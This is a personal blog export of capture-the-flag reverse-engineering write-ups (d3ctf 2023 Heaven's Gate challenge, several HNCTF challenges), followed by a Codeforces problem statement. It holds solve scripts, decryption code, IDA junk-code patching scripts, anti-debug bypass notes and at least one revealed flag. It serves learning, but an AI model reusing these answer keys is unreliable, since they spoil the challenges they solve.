    <content><![CDATA[<h6 id="好久没写blog了QAQ，受到某人启发觉得有空还是写写，多少动动笔吧。本来是打算先写安卓学习的那篇，想着找个题复现吧，回来看看d3那个写不明白的android，结果一看d3好几个题读作solved，写作看一眼毫无印象，遂决定回来重新做一次"><a href="#好久没写blog了QAQ，受到某人启发觉得有空还是写写，多少动动笔吧。本来是打算先写安卓学习的那篇，想着找个题复现吧，回来看看d3那个写不明白的android，结果一看d3好几个题读作solved，写作看一眼毫无印象，遂决定回来重新做一次" class="headerlink" title="好久没写blog了QAQ，受到某人启发觉得有空还是写写，多少动动笔吧。本来是打算先写安卓学习的那篇，想着找个题复现吧，回来看看d3那个写不明白的android，结果一看d3好几个题读作solved，写作看一眼毫无印象，遂决定回来重新做一次"></a>好久没写blog了QAQ，受到某人启发觉得有空还是写写，多少动动笔吧。本来是打算先写安卓学习的那篇，想着找个题复现吧，回来看看d3那个写不明白的android，<del>结果一看d3好几个题读作solved，写作看一眼毫无印象</del>，遂决定回来重新做一次</h6><span id="more"></span>
<h2 id="d3hell-attachment"><a href="#d3hell-attachment" class="headerlink" title="d3hell_attachment"></a>d3hell_attachment</h2><p><img src="/2023/07/11/d3ctf-2023/image-20230711190621273.png" alt="image-20230711190621273"></p>
<p>首先这里的d3runtime.dll就够可疑的了，调起来就有点印象。先在main开头断下来，果不其然modules里面的d3runtime.dll里面的东西很可疑</p>
<p><img src="/2023/07/11/d3ctf-2023/image-20230711191017764.png" alt="image-20230711191017764"></p>
<p>之前自己弄过一点dll加载相关的出题（后面有空写个blog记录一下，<del>希望不鸽,虽然已经鸽了半年</del>）这个位置直接调有时候窗口不会自己跳转过来，这里函数不多，直接往每个函数开头下断点</p>
<p>main里面的sleep常规nop掉，下面的逻辑看着是在骗人，真正的逻辑在dll里</p>
<p>胆大的直接F9，出锅了，调了调发现卡在sub_40216A，重来</p>
<p>压根没进main，tls_callback就把dll起起来了（第一遍动态的时候在dll下了断点，第二遍就直接发现了）</p>
<p>直接进了<code>d3runtime__61FC1628</code>看不出来啥用，有点像花但不能nop的</p>
<p><img src="/2023/07/11/d3ctf-2023/image-20230711192346716.png" alt="image-20230711192346716"></p>
<p>感觉是故意的…编译器会这么优化么…不能删这里，逻辑是中间的mov 和add 走两次，下面有个一样的操作</p>
<p>谁教的……</p>
<p>不能F5，单步往下</p>
<p>而后<code>d3runtime__61FC1578</code>函数，TEA加密，但是不知道啥用，接着调</p>
<p><img src="/2023/07/11/d3ctf-2023/image-20230711192920527.png" alt="image-20230711192920527"></p>
<p>这里上了反调，直接过掉，但是后面的代码很奇怪，明显反编译有问题，重调</p>
<p>注意到一个很奇怪的事情，这里：</p>
<p><img src="/2023/07/11/d3ctf-2023/image-20230711194724759.png" alt="image-20230711194724759"></p>
<p>合理的话按照上面相同的写法，应该是<code>E8 00 00 00 00</code>，但是这里少了一个00，一开始以为可以不需要，但是想想不对。这里怎么想都应该是<code>call $5</code>的操作，然后后面可以还原出上面的逻辑</p>
<p>哦，动动脑子，这里换32-bit了，天堂之门，对应题目hell</p>
<p>这里确实萌新没接触过天堂之门的，没从<code>tls</code>和<code>DllMainCRTStartup</code>里看出什么端倪，但是总归这里是32bit，那dump下来放进ida里看看，呜哇，修了半个小时修不明白</p>
<p>那也可以硬调吧，不妨碍，既然他能运行那姑且也可以调</p>
<p><img src="/2023/07/11/d3ctf-2023/image-20230711200137667.png" alt="image-20230711200137667"></p>
<p>调dll的确实…<del>不知道谁也出过类似的恶心题目</del></p>
<p>但是主逻辑有了的，下面<code>isdebuggerpresent</code>给他拿掉，这里主要是V0没有识别出来，跳转的时候没有找到jmp的位置，否则不会有那么多逃逸变量…</p>
<p>勉强可以辨认这里修改的表</p>
<p>回到main里，实际操作也就这里面：</p>
<p><img src="/2023/07/11/d3ctf-2023/image-20230711200826897.png" alt="image-20230711200826897"></p>
<p><code>byte_405060</code>刚才在dll已经走过了，差这个flag表，应当在这里走走：</p>
<p><img src="/2023/07/11/d3ctf-2023/image-20230711201100046.png" alt="image-20230711201100046"></p>
<p>再往前推么发现跟v12有关，于是牵扯到了<code>sub_40216A</code>，这里确实确实看不懂了，即使出题人好心没去结构体的符号表…</p>
<p>先说结论，这里是大整数分解。其次，看的别人的wp知道的</p>
<p>结论是这里把换后的表带入大整数分解，得到的两段拼接起来是flag…</p>
<h6 id="合着练了一下动调……实话说目前算是做不出来这个题的……"><a href="#合着练了一下动调……实话说目前算是做不出来这个题的……" class="headerlink" title="合着练了一下动调……实话说目前算是做不出来这个题的……"></a>合着练了一下动调……实话说目前算是做不出来这个题的……</h6><h6 id="嗯，天堂之门有空来写一个试试…-参考-原创-天堂之门-Heaven’s-Gate-C语言实现-软件逆向-看雪-安全社区-安全招聘-kanxue-com"><a href="#嗯，天堂之门有空来写一个试试…-参考-原创-天堂之门-Heaven’s-Gate-C语言实现-软件逆向-看雪-安全社区-安全招聘-kanxue-com" class="headerlink" title="嗯，天堂之门有空来写一个试试…[参考]([原创]天堂之门 (Heaven’s Gate) C语言实现-软件逆向-看雪-安全社区|安全招聘|kanxue.com)"></a>嗯，天堂之门有空来写一个试试…[参考]([<a href="https://bbs.kanxue.com/thread-270153.htm">原创]天堂之门 (Heaven’s Gate) C语言实现-软件逆向-看雪-安全社区|安全招聘|kanxue.com</a>)</h6><h6 id="结论，有经验的话就不算难题，但是初见还挺可怕的"><a href="#结论，有经验的话就不算难题，但是初见还挺可怕的" class="headerlink" title="结论，有经验的话就不算难题，但是初见还挺可怕的"></a>结论，有经验的话就不算难题，但是初见还挺可怕的</h6><h2 id><a href="#" class="headerlink" title></a></h2>]]></content>
  </entry>
  <entry>
    <title>hnctfRe</title>
    <url>/2022/11/02/hnctfRe/</url>
    <content><![CDATA[<h6 id="Some-reverse-questions-I-didn’t-have-time-to-solve-Or-didn’t-solve-out…"><a href="#Some-reverse-questions-I-didn’t-have-time-to-solve-Or-didn’t-solve-out…" class="headerlink" title="Some reverse questions I didn’t have time to solve. (Or didn’t solve out…)"></a>Some reverse questions I didn’t have time to solve. (Or didn’t solve out…)</h6><span id="more"></span>
<h3 id="Help-Me"><a href="#Help-Me" class="headerlink" title="Help_Me!"></a>Help_Me!</h3><h5 id="My-exp"><a href="#My-exp" class="headerlink" title="My exp:"></a>My exp:</h5><pre><code>#include&lt;bits/stdc++.h&gt;
using namespace std;
int v12[1000]=&#123;0&#125;;
int v13[1000]=&#123;0&#125;;
long long maxn;
int v[1000];
void dfs(int cns,int n,int num,long long sum)&#123;
    if (num&gt;200 || n==20)
    &#123;
        if (n!=20)
        sum-=v12[n];
        cns--;
        if (sum&gt;=maxn)&#123;
            maxn=sum;
            cout&lt;&lt;&quot;sum  =  &quot;&lt;&lt;sum&lt;&lt;&quot;    :  &quot;&lt;&lt;&quot;cns=&quot;&lt;&lt;cns&lt;&lt;&quot;   &quot;;
            for (int i=0;i&lt;cns;i++)&#123;
                cout&lt;&lt;v[i]&lt;&lt;&quot; &quot;;
            &#125;
            cout&lt;&lt;endl;
        &#125;
        return ;
    &#125;
    
    for (int i=n+1;i&lt;=20;i++)&#123;
        v[cns]=i;
        
        dfs(cns+1,i,num+v13[i],sum+v12[i]);
    &#125;
&#125;


int main()&#123;
    
    v12[0] = 26;
    v12[1] = 59;
    v12[2] = 30;
    v12[3] = 19;
    v12[4] = 66;
    v12[5] = 85;
    v12[6] = 94;
    v12[7] = 8;
    v12[8] = 3;
    v12[9] = 44;
    v12[20] = 1000;
    v12[10] = 5;
    v12[11] = 1;
    v12[12] = 41;
    v12[13] = 82;
    v12[14] = 76;
    v12[15] = 1;
    v12[16] = 12;
    v12[17] = 81;
    v12[18] = 73;
    v12[19] = 32;
    v12[20]=1;
    v13[0] = 71;
    v13[1] = 34;
    v13[20] = 1000;
    v13[2] = 82;
    v13[3] = 23;
    v13[4] = 1;
    v13[5] = 88;
    v13[6] = 12;
    v13[7] = 57;
    v13[8] = 10;
    v13[9] = 68;
    v13[10] = 5;
    v13[11] = 33;
    v13[12] = 37;
    v13[13] = 69;
    v13[14] = 98;
    v13[15] = 24;
    v13[16] = 26;
    v13[17] = 83;
    v13[18] = 16;
    v13[19] = 26;
    v13[20]=1;
    maxn=0;
    dfs(0,-1,0,1);
&#125;
</code></pre>
<h5 id="Official-exp"><a href="#Official-exp" class="headerlink" title="Official exp:"></a>Official exp:</h5><pre><code>#include &quot;iostream&quot;
#include &quot;stdio.h&quot;
using namespace std;
int val[50]=&#123;26, 59, 30, 19, 66, 85, 94, 8, 3, 44, 5, 1, 41, 82, 76, 1,    12,    81,    73,    32&#125;,
w[50]=&#123;71, 34, 82, 23, 1,88,12,57, 10, 68, 5, 33,    37,    69,    98,    24, 26,    83, 16, 26&#125;;
int dp[21][301];
int main()
&#123;
    int t=200;
    int m = 20;
    for(int i=1;i&lt;=m;i++) 
        for(int j=t;j&gt;=0;j--)  
    &#123;
        if(j&gt;=w[i])//容量可以放 
        &#123;
            int tmp;
            dp[i][j]=max(dp[i-1][j-w[i]]+val[i],dp[i-1][j]);
        &#125;  
        else
        &#123;
            dp[i][j]=dp[i-1][j];
        &#125;              
    &#125;
    //dp[i][j] = max(dp[i-1][j-w[i]]+val[i],dp[i-1][j]);
    int x = 20;
    int y = 200;
    while(x!=0)
    &#123;
        if(dp[x-1][y-w[x]]+val[x] &gt; dp[x-1][y])        
        &#123;
            printf(&quot;%d,&quot;,x); 
            y-=w[x];
        &#125;
        x-=1;
    &#125;
    return 0;
&#125;
</code></pre>
<p>A 0-1 bag problem. And notice that you should <c style="color: #FF0000;">ADD</c> v12, not MULTIPLY, like in the ida……</p>
<h3 id="CM2"><a href="#CM2" class="headerlink" title="CM2"></a>CM2</h3><h6 id="Don’t-understand-how-to-debug-to-find-the-place…-Though-by-guessing-I-work-it-out-anyway"><a href="#Don’t-understand-how-to-debug-to-find-the-place…-Though-by-guessing-I-work-it-out-anyway" class="headerlink" title="Don’t understand how to debug to find the place… Though by guessing I work it out anyway."></a>Don’t understand how to debug to find the place… Though by guessing I work it out anyway.</h6><h5 id="Officail-wp"><a href="#Officail-wp" class="headerlink" title="Officail wp:"></a>Officail wp:</h5><p><img src="/2022/11/02/hnctfRe/cm2.png" alt="cm2"></p>
<h3 id="Try2debugPlusPlus"><a href="#Try2debugPlusPlus" class="headerlink" title="Try2debugPlusPlus"></a>Try2debugPlusPlus</h3><p>Nop the <code>IsDebuggerPresent()</code>(noticed that there are two of them) and get the key(remember to set breakpoint after <code>printf()</code>):</p>
<p><img src="/2022/11/02/hnctfRe/debug2_1.png" alt="debug2_1"></p>
<p>Though is easy for us to decrypt the tea_encrypt, question setter seems to have forgotten something…</p>
<p><img src="/2022/11/02/hnctfRe/debug2_2.png" alt="debug2_2"></p>
<h3 id="What-1in-D11"><a href="#What-1in-D11" class="headerlink" title="What_1in_D11"></a>What_1in_D11</h3><p>Repair the upx’s features(easy in this problem, to study more you can refer to <a href="https://www.52pojie.cn/thread-326995-1-1.html">this blog</a>)</p>
<p>And <code>upx -d</code> to unpacked the .dll, check it in ida, we got:</p>
<p><img src="/2022/11/02/hnctfRe/dll_1.png" alt="dll"></p>
<h5 id="Official-writeup"><a href="#Official-writeup" class="headerlink" title="Official writeup:"></a>Official writeup:</h5><h6 id="A-btea-encrypt-which-I-am-not-fimilar-with-yet-Shall-get-more-study-about-encryption-and-decryption-later"><a href="#A-btea-encrypt-which-I-am-not-fimilar-with-yet-Shall-get-more-study-about-encryption-and-decryption-later" class="headerlink" title="(A btea encrypt, which I am not fimilar with yet. Shall get more study about encryption and decryption later.)"></a>(A btea encrypt, which I am not fimilar with yet. Shall get more study about encryption and decryption later.)</h6><pre><code>#include &lt;stdio.h&gt;  
#include &lt;stdint.h&gt;  
#define DELTA 0x9e3779b9  
#define MX (((z&gt;&gt;5^y&lt;&lt;2) + (y&gt;&gt;3^z&lt;&lt;4)) ^ ((sum^y) + (key[(p&amp;3)^e] ^ z)))  
void btea(uint32_t *v, int n, uint32_t const key[4])  
&#123;  
    uint32_t y, z, sum;  
    unsigned p, rounds, e;  
    if (n &gt; 1)            /* Coding Part */  
    &#123;  
        rounds = 6 + 52/n;  
        sum = 0;  
        z = v[n-1];  
        do  
        &#123;  
            sum += DELTA;  
            e = (sum &gt;&gt; 2) &amp; 3;  
            for (p=0; p&lt;n-1; p++)  
            &#123;  
                y = v[p+1];  
                z = v[p] += MX;  
            &#125;  
            y = v[0];  
            z = v[n-1] += MX;  
        &#125;  
        while (--rounds);  
    &#125;  
    else if (n &lt; -1)      /* Decoding Part */  
    &#123;  
        n = -n;  
        rounds = 6 + 52/n;  
        sum = rounds*DELTA;  
        y = v[0];  
        do  
        &#123;  
            e = (sum &gt;&gt; 2) &amp; 3;  
            for (p=n-1; p&gt;0; p--)  
            &#123;  
                z = v[p-1];  
                y = v[p] -= MX;  
            &#125;  
            z = v[n-1];  
            y = v[0] -= MX;  
            sum -= DELTA;  
        &#125;  
        while (--rounds);  
    &#125;  
&#125;  
int main()  
&#123;  
    unsigned int enc[8]=&#123;0x22a577c1,0x1c12c03,0xc74c3ebd,0xa9d03c85,0xadb8ffb3&#125;;
    uint32_t const k[4]= &#123;55,66,77,88&#125;;  
    int n= 5; //n的绝对值表示v的长度，取正表示加密，取负表示解密  
    // v为要加密的数据是两个32位无符号整数  
    // k为加密解密密钥，为4个32位无符号整数，即密钥长度为128位  
    btea(enc, -n, k);  
    for(int i=0;i&lt;5;i++)
    &#123;
            printf(&quot;%x&quot;,enc[i]);
        &#125;
    return 0;  
&#125;  
</code></pre>
<h3 id="Mazes"><a href="#Mazes" class="headerlink" title="Mazes"></a>Mazes</h3><h6 id="A-bit-complex-wait-until-later…"><a href="#A-bit-complex-wait-until-later…" class="headerlink" title="A bit complex, wait until later…"></a>A bit complex, wait until later…</h6><h3 id="stub"><a href="#stub" class="headerlink" title="stub"></a>stub</h3><h6 id="Never-seen-before-later…"><a href="#Never-seen-before-later…" class="headerlink" title="Never seen before, later…"></a>Never seen before, later…</h6><h3 id="ez-maze"><a href="#ez-maze" class="headerlink" title="ez_maze"></a>ez_maze</h3><p>We get a .exe file, from its’ icon we know that we should uncompile it to .pyc with <code>pyinstxtractor</code></p>
<p><img src="/2022/11/02/hnctfRe/ez_maze_1.png" alt="ez_maze"></p>
<p>Then, we got a package <code>_extracted</code>:</p>
<h6 id="complex-it-is…"><a href="#complex-it-is…" class="headerlink" title="complex it is…"></a>complex it is…</h6><p><img src="/2022/11/02/hnctfRe/extracted.png" alt="extracted"></p>
<p>Find a file named <code>maze</code> (without a suffix one!) Change its suffix into <code>.pyc</code> and Try <code>compyle6 -o maze.py maze.pyc</code>, it went wrong:</p>
<p><img src="/2022/11/02/hnctfRe/uncompyle6.png" alt="compyle6"></p>
<p>That’s when you find out that pyinstxtractor didn’t fix your .pyc file’s magic number.</p>
<p><img src="/2022/11/02/hnctfRe/cmakeInstall.png" alt="cmake"></p>
<p><a href="https://www.jb51.net/article/231188.htm">The link problem setter gives you</a>, which does no help at all…The <code>magic number</code> of the file <code>struct</code> is destroy as well…</p>
<p><img src="/2022/11/02/hnctfRe/magicNumber_1.jpg" alt="magicNumber_1"></p>
<p>I been trying tools like <code>uncompyle6</code>(which does not support python 3.10, and install python 3.9 does not help at all. Later I should look into this problem and try to solved it…)  and <code>pycdc</code>(which is said to support high edition, but can not identify the magic number as well) However, when I tried to add some magic number from other python edition(Python 3.8b2, if I remember it right), and put it in an <a href="https://tool.lu/pyc/">online uncompiler</a>. It just worked…</p>
<blockquote>
<p><a href="https://www.cnblogs.com/Here-is-SG/p/15885799.html">a blog from my classmate that may help(though I do not really think so…)</a></p>
</blockquote>
<h5 id="some-magic-number"><a href="#some-magic-number" class="headerlink" title="some magic number:"></a>some magic number:</h5><pre><code>enum PycMagic &#123;
    MAGIC_1_0 = 0x00999902,
    MAGIC_1_1 = 0x00999903, /* Also covers 1.2 */
    MAGIC_1_3 = 0x0A0D2E89,
    MAGIC_1_4 = 0x0A0D1704,
    MAGIC_1_5 = 0x0A0D4E99,
    MAGIC_1_6 = 0x0A0DC4FC,

    MAGIC_2_0 = 0x0A0DC687,
    MAGIC_2_1 = 0x0A0DEB2A,
    MAGIC_2_2 = 0x0A0DED2D,
    MAGIC_2_3 = 0x0A0DF23B,
    MAGIC_2_4 = 0x0A0DF26D,
    MAGIC_2_5 = 0x0A0DF2B3,
    MAGIC_2_6 = 0x0A0DF2D1,
    MAGIC_2_7 = 0x0A0DF303,

    MAGIC_3_0 = 0x0A0D0C3A,
    MAGIC_3_1 = 0x0A0D0C4E,
    MAGIC_3_2 = 0x0A0D0C6C,
    MAGIC_3_3 = 0x0A0D0C9E,
    MAGIC_3_4 = 0x0A0D0CEE,
    MAGIC_3_5 = 0x0A0D0D16,
    MAGIC_3_5_3 = 0x0A0D0D17,
    MAGIC_3_6 = 0x0A0D0D33,
    MAGIC_3_7 = 0x0A0D0D42,
    MAGIC_3_8 = 0x0A0D0D55,
    MAGIC_3_9 = 0x0A0D0D61,
&#125;;
</code></pre>
<p>uncompyle:(to long the maze is, I didn’t put it here)</p>
<p><img src="/2022/11/02/hnctfRe/uncompyle.jpg" alt="uncompyle"></p>
<p>Dfs script(From official wp):</p>
<pre><code>map1=[...]
map2 =  [[0 for i in range(len(map1))] for i in range(len(map1)) ]
flag=&quot;&quot;
def DFS(x,y):
    global flag
    if x == len(map1) - 2 and y == len(map1) - 2: #判断边界
        print(flag)
    if map1[x+1][y] == 0 and map2[x+1][y] == 0:
        map2[x][y] = 1
        flag += &#39;s&#39;
        DFS(x+1,y)
        flag = flag[:-1]
        map2[x][y] = 0
    if map1[x-1][y] == 0 and map2[x-1][y] == 0:
        map2[x][y] = 1
        flag += &#39;w&#39;
        DFS(x-1,y)
        flag = flag[:-1]
        map2[x][y] = 0
    if map1[x][y+1] == 0 and map2[x][y+1] == 0:
        map2[x][y] = 1
        flag += &#39;d&#39;
        DFS(x,y+1)
        flag = flag[:-1]
        map2[x][y] = 0
    if map1[x][y-1] == 0 and map2[x][y-1] == 0:
        map2[x][y] = 1
        flag += &#39;a&#39;
        DFS(x,y-1)
        flag = flag[:-1]
        map2[x][y] = 0
y=1
x=1
DFS(x,y)
</code></pre>
<h3 id="findit"><a href="#findit" class="headerlink" title="findit"></a>findit</h3><p>Gets a .exe file, check whether shell exists.</p>
<p><img src="/2022/11/02/hnctfRe/findItShell.png" alt="shell"></p>
<h5 id="Open-it-with-ida"><a href="#Open-it-with-ida" class="headerlink" title="Open it with ida."></a>Open it with ida.</h5><p><img src="/2022/11/02/hnctfRe/finditIda_1.png" alt="ida1"><br><img src="/2022/11/02/hnctfRe/finditIda_2.png" alt="ida2"><br><img src="/2022/11/02/hnctfRe/finditIda_3.png" alt="ida3"></p>
<p>A complex encryption. The key and the flag both needs to be brute forces out. I shall do a emersion later…</p>
<h5 id="Official-wp"><a href="#Official-wp" class="headerlink" title="Official wp:"></a>Official wp:</h5><pre><code>mid=[32,59,121,60,125,45,32,17,38,0,43,45,48,48,28,42,11,20,49,100,63,119,103,53,173,46,136,158,49,78,78,176]
enc=[29,70,92,84,87,19,61,43,62,60,29,9,18,63,6,6,42,14,124,110,109,60,105,191,7,162,64,104,92,61,223,179]
flag=[0]*32
flag[31]=179
flag[30]=223
print(flag)
#th1s_3ncryt_is_s0_e@sy!1
key = [ord(i) for i in &quot;HN_CTF&quot;]
def decrypt(arr):
    for i in range(0,len(arr)//4):
        tmp = arr[4*i:4*i+4]
        st = &quot;&quot;
        st+=chr(tmp[3]^key[i%6])
        st+=chr(tmp[0]^key[i%6])
        st+=chr(tmp[2]^key[i%6])
        st+=chr(tmp[1]^key[i%6])
        print(st,end=&#39;&#39;)
    print()   
    pass
def dfs(deep):
    global flag
    if(deep==0):
        decrypt(flag)
    else:
        for i in range(0,0xff):
            if( enc[deep-1] == (0x12+deep-1)^ ((i+12)%24 )^ i ^ flag[deep]):
                flag[deep-1] = i
                dfs(deep-1)
dfs(31)
</code></pre>
<h3 id="flower"><a href="#flower" class="headerlink" title="flower"></a>flower</h3><p>From ida, there are a lot of junkcodes inside, and we have to patch them before I can analyze the code.</p>
<p><a href="https://www.52pojie.cn/thread-1512089-1-1.html">junkcode</a></p>
<h5 id="Some-script-to-nop-the-junkcodes"><a href="#Some-script-to-nop-the-junkcodes" class="headerlink" title="Some script to nop the junkcodes:"></a>Some script to nop the junkcodes:</h5><p><img src="/2022/11/02/hnctfRe/flower_junkcode_1.png" alt="junkcode1"></p>
<h5 id="scripts1"><a href="#scripts1" class="headerlink" title="scripts1:"></a>scripts1:</h5><pre><code>import idc
import idautils
start =0x00401000
end = 0x00401401
bad=[0x75,0x02,0x74,0x01,0xc7]

for i in range(start,end):
    if idc.get_wide_byte(i) == 0x75:
        flag=1
        for j in range(len(bad)):
            if(idc.get_wide_byte(i+j)!= bad[j]):
                flag=0
                break
        if flag==1:
            for j in range(len(bad)):
                patch_byte(i+j,0x90)
                print(&quot;success&quot;)
</code></pre>
<h5 id="scripts2"><a href="#scripts2" class="headerlink" title="scripts2:"></a>scripts2:</h5><p><img src="/2022/11/02/hnctfRe/flower_junkcode_2.png" alt="junkcode2"></p>
<pre><code>import idc
import idautils
start =0x00401000
end = 0x00401401
bad=[0xe8,0x01,0x00,0x00,0x00,0xe8,0x36,0x83,0x04,0x24,0x08,0xc3,0xe8]

for i in range(start,end):
    if idc.get_wide_byte(i) == 0xe8:
        flag=1
        for j in range(len(bad)):
            if(idc.get_wide_byte(i+j)!= bad[j]):
                flag=0
                break
        if flag==1:
            for j in range(len(bad)):
                patch_byte(i+j,0x90)
                print(&quot;success&quot;)
</code></pre>
<h6 id="Some-interlude"><a href="#Some-interlude" class="headerlink" title="Some interlude:"></a>Some interlude:</h6><p><img src="/2022/11/02/hnctfRe/flowerPDF.png" alt="PDF"></p>
<h5 id="Anyway-the-uncompilation-shall-look-like-this"><a href="#Anyway-the-uncompilation-shall-look-like-this" class="headerlink" title="Anyway, the uncompilation shall look like this:"></a>Anyway, the uncompilation shall look like this:</h5><p><img src="/2022/11/02/hnctfRe/flowerIda.png" alt="ida"></p>
<h5 id="The-encrypt-function"><a href="#The-encrypt-function" class="headerlink" title="The encrypt function:"></a>The encrypt function:</h5><p><img src="/2022/11/02/hnctfRe/flowerEncrypt.png" alt="encrypt"></p>
<h5 id="Now-we-get-the-encryption-we-can-know-that-it-is-a-RC4-encryption-and-here-comes-the-official-exp"><a href="#Now-we-get-the-encryption-we-can-know-that-it-is-a-RC4-encryption-and-here-comes-the-official-exp" class="headerlink" title="Now we get the encryption, we can know that it is a RC4- encryption, and here comes the official exp:"></a>Now we get the encryption, we can know that it is a RC4- encryption, and here comes the official exp:</h5><pre><code>#include &lt;iostream&gt;
using namespace std;
unsigned int ar[40] = &#123; 0x4d,0xffffffe6,0x49,0xffffff95,0x3,0x2d,0x2b,0xffffffba,0xffffffea,0x6d,0xffffffff,0x59,0x70,0x0,0x1b,0xffffffa9,0x2c,0xffffffb0,0x32,0xffffff98,0x6f,0xffffff8c,0x56,0xffffffa2,0x4c,0x79,0x7f &#125;;
// c[i]_ = c[i]^c[(i+1)%27]
// c[26]_ = c[26]^c_[0]
unsigned char st[16] = &quot;Hello_Ctfers!!!&quot;;
void O0oo00OOo00o0(unsigned char *m, int mlen, int keylen) &#123;
        unsigned char s[256];
        unsigned char t[256];
        int i;
        for ( i = 0; i &lt; 256; i++) &#123; //初始化s和t向量 
                s[i] = i;
                t[i] = st[i%keylen];
        &#125;        
        int j = 0;
        for ( i = 0; i &lt; 256; i++) &#123;
                j = (j + s[i] + t[i]) % 256;
                swap(s[i],s[j]);
                //根据t向量打乱s盒 
        &#125;
        unsigned char k[64];//保存秘钥流，或者直接进行异或 
        i = 0; j = 0; 
        int tmp;
        int index ;
        for ( index = 0; index &lt; mlen; index++) &#123;   //生成与明文长度一致的秘钥流 
                i = (i + 3) % 256;
                j = (j + s[i]+1) % 256;
                swap(s[i],s[j]); 
                tmp = (s[i] + s[j]) % 256;
                k[index] = s[tmp];//保存秘钥 
        &#125;
        for (i = 0; i &lt; mlen; i++)
        &#123;
                m[i] = m[i] ^ k[i];//主要进行了一步异或，加密的逆过程就是解密 
        &#125;
&#125;
int main()
&#123;
        char c[27]=&#123;0x4d,0xffffffe6,0x49,0xffffff95,0x3,0x2d,0x2b,0xffffffba,0xffffffea,0x6d,0xffffffff,0x59,0x70,0x0,0x1b,0xffffffa9,0x2c,0xffffffb0,0x32,0xffffff98,0x6f,0xffffff8c,0x56,0xffffffa2,0x4c,0x79,0x7f &#125;;
        int i;
        for(i=26;i&gt;=0;i--)
        &#123;
                c[i] = c[(i+1)%27]^c[i];
        &#125;
        for(i=0;i&lt;27;i++)
        &#123;
                printf(&quot;0x%x,&quot;,c[i]) ;
        &#125;
        O0oo00OOo00o0((unsigned char *)c,27,16);
        printf(&quot;\n&quot;);
                for(i=0;i&lt;27;i++)
        &#123;
                printf(&quot;%c&quot;,c[i]&amp;0xff) ;
        &#125;
&#125;
</code></pre>
<p>It base on static crack here, but a bro told me that since there is only <c style="color: #FF0000;">ONE</c> <code>XOR</code> that really do something to your flag, you can dynamic debug to get the array <code>v4</code>. (in the upper encryption photograth) Which is really genius because whether you know how to decrypt rc4 or not you can solve this problem and it do save you tons of work!</p>
<h6 id="Just-input-a-series-of-‘1’-and-look-into-the-ECX-register"><a href="#Just-input-a-series-of-‘1’-and-look-into-the-ECX-register" class="headerlink" title="Just input a series of ‘1’ and look into the ECX register!"></a>Just input a series of ‘1’ and look into the <code>ECX</code> register!</h6><p><img src="/2022/11/02/hnctfRe/dynamic_1.png" alt="dynamic_1"><br><img src="/2022/11/02/hnctfRe/dynamic_2.png" alt="dynamic_2"><br><img src="/2022/11/02/hnctfRe/dynamic_3.png" alt="dynamic_3"><br><img src="/2022/11/02/hnctfRe/dynamic_4.png" alt="dynamic_4"><br><img src="/2022/11/02/hnctfRe/dynamic_5.png" alt="dynamic_5"></p>
<h5 id="And-so-on…"><a href="#And-so-on…" class="headerlink" title="And so on…"></a>And so on…</h5><pre><code>###### Two thinkings(should be tried out later):
###### Can `angr` solve `rc4` immediately?
###### Can I add a `hook` so it prints the `ECX` rightaway and I don&#39;t need to check it once and once again?
######                                                                                          --2022.11.4
</code></pre>
<p>From here, the last few problems are quite hard…</p>
<h3 id="MAZE"><a href="#MAZE" class="headerlink" title="MAZE"></a>MAZE</h3><p>We found thounds of junkcodes here, and we nop them:</p>
<pre><code>import idc
import idautils
start =0x00140001000
end = 0x00140CEF1F0
bad=[0x50,0x48,0x0f,0xc7,0xf0,0x58]

for i in range(start,end):
    if idc.get_wide_byte(i) == 0x50:
        flag=1
        for j in range(len(bad)):
            if(idc.get_wide_byte(i+j)!= bad[j]):
                flag=0
                break
        if flag==1:
            for j in range(len(bad)):
                patch_byte(i+j,0x90)
                print(&quot;success&quot;)
</code></pre>
]]></content>
      <tags>
        <tag>ctf</tag>
        <tag>reverse</tag>
      </tags>
  </entry>
  <entry>
    <title>codeforce-817E</title>
    <url>/2022/09/02/codeforce-817E/</url>
    <content><![CDATA[<h1 id="codeforces-817E"><a href="#codeforces-817E" class="headerlink" title="codeforces 817E"></a>codeforces 817E</h1><span id="more"></span>
<h3 id="The-problem"><a href="#The-problem" class="headerlink" title="The problem"></a>The problem</h3><blockquote>
<p>E. Counting Rectangles<br>time limit per test6 seconds<br>memory limit per test256 megabytes<br>inputstandard input<br>outputstandard output<br>You have n rectangles, the i-th rectangle has height hi and width wi.<br>You are asked q queries of the form hs ws hb wb.<br>For each query output, the total area of rectangles you own that can fit a rectangle of height hs and width ws while also fitting in a rectangle of height hb and width wb. In other words, print ∑hi⋅wi for i such that hs&lt;hi&lt;hb and ws&lt;wi&lt;wb.<br>Please note, that if two rectangles have the same height or the same width, then they cannot fit inside each other. Also note that you cannot rotate rectangles.<br>Please note that the answer for some test cases won’t fit into 32-bit integer type, so you should use at least 64-bit integer type in your programming language (like long long for C++).</p>
<blockquote>
<p>Input<br>The first line of the input contains an integer t (1≤t≤100) — the number of test cases.<br>The first line of each test case two integers n,q (1≤n≤105; 1≤q≤105) — the number of rectangles you own and the number of queries.<br>Then n lines follow, each containing two integers hi,wi (1≤hi,wi≤1000) — the height and width of the i-th rectangle.<br>Then q lines follow, each containing four integers hs,ws,hb,wb (1≤hs&lt;hb, ws&lt;wb≤1000) — the description of each query.<br>The sum of q over all test cases does not exceed 105, and the sum of n over all test cases does not exceed 105.<br>Output<br>For each test case, output q lines, the i-th line containing the answer to the i-th query.</p>
<blockquote>
<p>Example<br>inputCopy<br>3<br>2 1<br>2 3<br>3 2<br>1 1 3 4<br>5 5<br>1 1<br>2 2<br>3 3<br>4 4<br>5 5<br>3 3 6 6<br>2 1 4 5<br>1 1 2 10<br>1 1 100 100<br>1 1 3 3<br>3 1<br>999 999<br>999 999<br>999 998<br>1 1 1000 1000<br>outputCopy<br>6<br>41<br>9<br>0<br>54<br>4<br>2993004</p>
</blockquote>
</blockquote>
</blockquote>
